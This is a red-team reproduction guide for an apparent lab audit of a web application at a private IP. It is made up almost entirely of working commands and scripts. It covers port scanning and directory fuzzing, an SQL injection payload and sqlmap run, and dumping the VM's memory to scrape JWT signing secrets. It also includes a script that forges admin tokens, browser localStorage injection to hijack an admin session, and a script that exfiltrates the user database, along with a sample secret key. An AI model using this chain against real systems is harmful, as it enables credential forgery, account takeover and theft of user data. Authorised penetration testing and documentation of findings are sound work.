# Step-by-Step Reproduction Guide: CSAI Red Team Audit
**Target IP:** 192.168.56.137
**Environment:** Kali Linux VM (Attacker) and Windows 11 Host.

This document outlines the exact procedures, commands, and scripts required to reproduce the full exploit chain detailed in the `audit_report.md`.

---

## Phase 1: Network & Surface Enumeration (Kali Linux)

### 1. Identify Target and Open Ports
First, verify the target via ARP and execute a full port scan to identify exposed services.
```bash
# Host discovery via ARP (bypassing ICMP blocks)
nmap -sn 192.168.56.137 -PR

# Full TCP port scan with Version Detection
nmap -sS -sV -p- -T4 192.168.56.137 -v
```

### 2. Assess Web Configurations
Probe the web application running on port 443 to extract headers, map frontend architecture, and fuzz for backend paths.
```bash
# Read server security headers
curl -I -k https://192.168.56.137

# Execute automated infrastructure scan
nikto -h https://192.168.56.137 -ssl

# Enumerate hidden directories / backend endpoints
ffuf -u https://192.168.56.137/backend/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,401,403,500 -p 1.0 -k -s
```

---

## Phase 2: Logical Attack Surface Evaluation (Kali Linux)

### 3. Verify Authentication Resilience
Attempt standard logic attacks such as SQL Injections and evaluate Rate Limiting thresholds.
```bash
# Basic baseline payload for Authentication / SQLi
curl -k -X POST https://192.168.56.137/backend/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin'\''--","password":"Password1!"}'

# Verify strict Rate Limiting properties via bash looping
for i in {1..7}; do 
  curl -s -k -X POST https://192.168.56.137/backend/api/auth/login \
       -H "Content-Type: application/json" \
       -d '{"username":"admin","password":"wrongpassword"}'
  echo ''
done
```

### 4. Advanced Payload Injection Validation
Use SQLMap to verify that the core RESTful APIs are properly typed and hardened.
```bash
# (Requires a valid JWT to access /users)
sqlmap -u "https://192.168.56.137/backend/api/users/1" \
       --header "Authorization: Bearer [MOCK_OR_REAL_JWT]" \
       --batch --dbms mssql --level 3 --risk 2
```

---

## Phase 3: Hardware Exploitation & Memory Dumping (Windows Host)

Due to strong application defenses, pivot to exploiting the Host-Guest relationship by analyzing the VM's active memory.

### 5. Create Core Memory Dump
Execute VirtualBox's internal debugger to drop the VM's volatile memory straight to the Windows 11 host.
```powershell
# In PowerShell (Windows 11 Host)
& "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" debugvm "CSAI" dumpvmcore --filename=c:\temp\csai_mem_new.elf
```

### 6. Verify Dump Integrity
Verify the dump contains relevant target application bytes.
```powershell
py -c "f=open(r'c:\temp\csai_mem_new.elf','rb'); d=f.read(1024*1024*500); print(b'SecureWebAppDb' in d)"
# Expected Output: True
```

---

## Phase 4: Secret Extraction & Forgery (Windows Host)

### 7. Scrape the Memory Dump for JWT Keys
Use the following Python script to sift through the `.elf` core dump looking for Base64 blocks located immediately following `SecretKey` labels.

Save as `extract_keys.py`:
```python
import re
import os

def extract_jwt_secrets(file_path):
    print(f"Scanning {file_path} for JWT Secrets...")
    labels = [b"SecretKey", b"S\x00e\x00c\x00r\x00e\x00t\x00K\x00e\x00y"]
    b64_pattern = re.compile(rb'[a-zA-Z0-9+/]{43}=')
    
    found_candidates = []
    with open(file_path, "rb") as f:
        chunk_size = 1024 * 1024 * 50
        overlap = 1024
        pos = 0
        while True:
            chunk = f.read(chunk_size)
            if not chunk: break
            for label in labels:
                idx = chunk.find(label)
                while idx != -1:
                    context = chunk[idx:idx+300]
                    for m in b64_pattern.findall(context):
                        cand = m.decode('ascii')
                        if cand not in found_candidates:
                            found_candidates.append(cand)
                    idx = chunk.find(label, idx + 1)
            pos += chunk_size - overlap
            f.seek(pos)

    with open("targeted_candidates.txt", "w") as out:
        for c in found_candidates:
            out.write(c + "\n")
    print(f"Candidates saved to targeted_candidates.txt")

extract_jwt_secrets(r"c:\temp\csai_mem_new.elf")
```
Run it: `python extract_keys.py`

### 8. Automated Key Validation
Test the extracted candidates by rapidly forging tokens and interrogating the web backend.

Save as `validate_keys.py`:
```python
import jwt, time, requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def forge_token(secret):
    payload = {"sub": "1", "name": "admin", "role": "Admin", "iss": "SecureWebApp", "aud": "SecureWebAppClient", "exp": int(time.time()) + 3600}
    return jwt.encode(payload, secret, algorithm="HS256")

with open("targeted_candidates.txt", "r") as f:
    candidates = [line.strip() for line in f if len(line.strip()) == 44]

for secret in candidates:
    token = forge_token(secret)
    res = requests.get("https://192.168.56.137/backend/api/users", headers={"Authorization": f"Bearer {token}"}, verify=False)
    if res.status_code == 200:
        print(f"\n[!] VALID SECRET FOUND: {secret}")
        break
```
Run it: `python validate_keys.py` (Assuming target IP is valid and reachable from Host)

---

## Phase 5: Domination & Exfiltration 

### 9. Graphic UI Domain Hijacking (Browser)
With the validated token in hand, inject it directly into the application's browser `localStorage` to hijack an administrative graphical session.

1. Navigate to `https://192.168.56.137/login`
2. Open Developer Tools (F12) -> Console.
3. Inject Credentials:
```javascript
localStorage.setItem('authToken', '[PASTE_FORGED_JWT_HERE]');
localStorage.setItem('user', JSON.stringify({
    id: 1, username: 'ice_tea', role: 'Admin', fullName: 'Administrator', email: 'icecube@securewebapp.local'
}));
```
4. Navigate manually via URL bar to `https://192.168.56.137/dashboard`.

### 10. Automated Database Exfiltration
Dump the target users database bypassing all active authentication.

Save as `dump_db.py` and execute:
```python
import jwt, time, requests, urllib3, json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VALID_SECRET = "CWgLnSB5JKpgba6BWyzwV8Uf+qDpErvjMPfpv9vIifg=" # Replace with key from Step 8
URL = "https://192.168.56.137/backend/api/users"

token = jwt.encode({"sub": "1", "name": "admin", "role": "Admin", "iss": "SecureWebApp", "aud": "SecureWebAppClient", "exp": int(time.time()) + 3600}, VALID_SECRET, algorithm="HS256")

response = requests.get(URL, headers={"Authorization": f"Bearer {token}"}, verify=False)
if response.status_code == 200:
    data = response.json()
    with open("exfiltrated_users.json", "w") as f:
        json.dump(data, f, indent=2)
    print(f"SUCCESS: Extracted {len(data['data'])} records to exfiltrated_users.json")
```
